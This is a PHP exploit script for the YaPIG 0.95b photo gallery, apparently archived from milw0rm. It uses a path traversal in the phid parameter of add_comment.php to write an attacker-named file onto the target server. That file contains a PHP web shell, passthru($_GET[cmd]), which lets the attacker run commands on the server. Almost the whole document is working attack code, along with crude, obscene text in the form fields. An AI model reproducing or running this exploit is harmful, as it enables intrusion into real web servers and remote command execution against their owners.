<?php


/*

                            \\\|///
                          \\  - -  //
                           (  @ @ )
                    ----oOOo--(_)-oOOo--------------------------------------------------
                    Portal : YaPIG 0.95b
                    Vendor : http://yapig.sourceforge.net
                    Author : Dj7xpl
                    We Are : Y4Ho0 -Mr.Mithridates -Sir SiSiLi -System Failure -Satanic Soulfull -And Me
                    Email  : Dj7xpl@yahoo.com
                    Home   : WwW.Dj7xpl.2600.ir
                    ---------------Ooooo------------------------------------------------
                                   (   )
                          ooooO     ) /
                          (   )    (_/
                           \ (
                            \_)

*/

if ($argc<3) {
print_r('
-----------------------------------------------------------------------------

Usage: php '.$argv[0].' Host Path shell Options
host:       Target server (ip/hostname)
path:       Path To Folder
Shell:      Shell Name

Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy

Example:
php '.$argv[0].' 127.0.0.1 /Yapig/ shell.php -P1.1.1.1:80

-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$file=$argv[3];


$port=80;
$proxy="";
for ($i=7; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

/*Data*/

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="tit"

Fuck You!
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="aut"

Dj7xpl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="mail"

dj7xpl@2600.ir
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="web"

<?php passthru($_GET[cmd]);?>
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="msg"

I Am Dj7xpl, I Want Fuck You!
-----------------------------7d6224c08dc
';

echo "Powered By Y! Underground Group\r\n";
echo "discovered&Coded By Dj7xpl\r\n";
echo "Sending Data To Target ...\n";
echo "Shell : ".$host."".$path."1_".$file."\n";

/*Sending Data*/
$packet ="POST ".$p."add_comment.php?gid=1&phid=../../".$file." HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

?>

# milw0rm.com [2007-05-02]
